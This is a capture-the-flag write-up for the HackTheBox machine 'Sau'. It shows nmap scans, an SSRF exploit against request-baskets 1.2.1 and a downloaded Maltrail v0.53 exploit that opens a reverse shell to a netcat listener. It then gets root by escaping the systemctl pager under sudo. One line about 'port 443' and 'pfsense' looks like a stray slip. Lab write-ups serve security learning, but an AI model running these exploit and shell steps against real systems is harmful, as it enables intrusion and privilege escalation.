---
layout: page
title: Sau
description: Sau from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/sau/logo.png" title="HTB Sau Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Sau">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Insert clever pun here!

Run nmap and get a list of the ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/sau]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.224                   
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 14:46 AEDT
Nmap scan report for 10.10.11.224
Host is up (0.028s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     http    Golang net/http server

<snip>
```
{% endraw %}

<br />
Run nmap against all the ports to find any non-standard services.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/sau]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.11.224     
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 14:46 AEDT
Nmap scan report for 10.10.11.224
Host is up (0.015s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 15.45 seconds
```
{% endraw %}

<br />
Check what is running on port 443.  Note the pfsense installation.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sau/landing55555.png" title="Port 55555 Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
View the source code for the 55555 landing page.

{% raw %}
```html
view-source:http://10.10.11.224:55555/web

<!DOCTYPE html>
<html>
<head lang="en">
  <title>Request Baskets</title>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">
  <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

<snip>

  <footer class="footer">
    <div class="container">
      <p class="text-muted">
        <small>
          Powered by <a href="https://github.com/darklynx/request-baskets">request-baskets</a> |
          Version: 1.2.1
        </small>
      </p>
    </div>
  </footer>
</body>
</html>
```
{% endraw %}

<br />
Check the name of the program running and its version so we can research it.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sau/fingerprint.png" title="Fingerprint" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try creating a basket to try out the program.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sau/create.png" title="Create Basket" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Perform research on request-baskets, version 1.2.1.  Look for any vulnerabilities or exploits.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sau/baskexp.png" title="Basket Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/mathias-mrsn/request-baskets-v121-ssrf">https://github.com/mathias-mrsn/request-baskets-v121-ssrf</a>

<br />
Download the exploit.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/sau]
└─$ wget https://raw.githubusercontent.com/mathias-mrsn/request-baskets-v121-ssrf/refs/heads/master/exploit.py
--2025-01-29 14:47:48--  https://raw.githubusercontent.com/mathias-mrsn/request-baskets-v121-ssrf/refs/heads/master/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 2606:50c0:8002::154, 2606:50c0:8000::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1308 (1.3K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   1.28K  --.-KB/s    in 0s      

2025-01-29 14:47:48 (72.7 MB/s) - ‘exploit.py’ saved [1308/1308]
```
{% endraw %}

<br />
Run the exploit.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/sau]
└─$ python3 exploit.py http://10.10.11.224:55555 http://127.0.0.1
Exploit for SSRF vulnerability on Request-Baskets (1.2.1) (CVE-2023-27163).
Exploit successfully executed.
Any request sent to http://10.10.11.224:55555/koicwd will now be forwarded to the service on http://127.0.0.1.
```
{% endraw %}

<br />
The exploit is forwarding the localhost webserver on port 80 to the new basket that we just created.  Try navigating to this page in the web browser and view the internal website.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sau/landing80.png" title="Port 80 Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Lookup Mailtrail, v0.53, to see if any known vulnerabilities exist.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sau/mailexp.png" title="Mailtrail Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/spookier/Maltrail-v0.53-Exploit">https://github.com/spookier/Maltrail-v0.53-Exploit</a>

<br />
Download this new exploit so we can run it.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/sau]
└─$ wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py -O mailexploit.py
--2025-01-29 15:01:18--  https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 2606:50c0:8002::154, 2606:50c0:8000::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2200 (2.1K) [text/plain]
Saving to: ‘mailexploit.py’

mailexploit.py                                             100%[========================================================================================================================================>]   2.15K  --.-KB/s    in 0s      

2025-01-29 15:01:18 (45.5 MB/s) - ‘mailexploit.py’ saved [2200/2200]
```
{% endraw %}

<br />
Start a listener.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/sau]
└─$ sudo nc -nlvp 443                            
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Run the exploit.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/sau]
└─$ python3 mailexploit.py 10.10.16.12 443 http://10.10.11.224:55555/koicwd
Running exploit on http://10.10.11.224:55555/koicwd/login
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/sau]
└─$ sudo nc -nlvp 443                            
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.11.224] 34026
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
python3 -c 'import pty; pty.spawn("/bin/bash");'
puma@sau:/opt/maltrail$
```
{% endraw %}

<br />
Snag that user.txt flag.

{% raw %}
```sh
puma@sau:~$ cat user.txt
cat user.txt
<redacted>
puma@sau:~$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:d4:ca brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.224/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:d4ca/64 scope global dynamic mngtmpaddr 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:d4ca/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Run sudo -l to see what commands we can run as sudo.

{% raw %}
```sh
puma@sau:~$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
{% endraw %}

<br />
Research systemctl to see all the different ways that we can abuse it to privesc.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sau/expnotes.png" title="Exploit Notes" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/</a>

<br />
Run the sudo command and then drop into a shell.

{% raw %}
```sh
puma@sau:~$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sh
!sshh!sh
# 
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```sh
# cat /root/root.txt
cat /root/root.txt
<redacted>
# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:42:ac brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.224/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:42ac/64 scope global dynamic mngtmpaddr 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:42ac/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Hopefully, you enjoyed the read.  Feel free to saunter back to read more write-ups.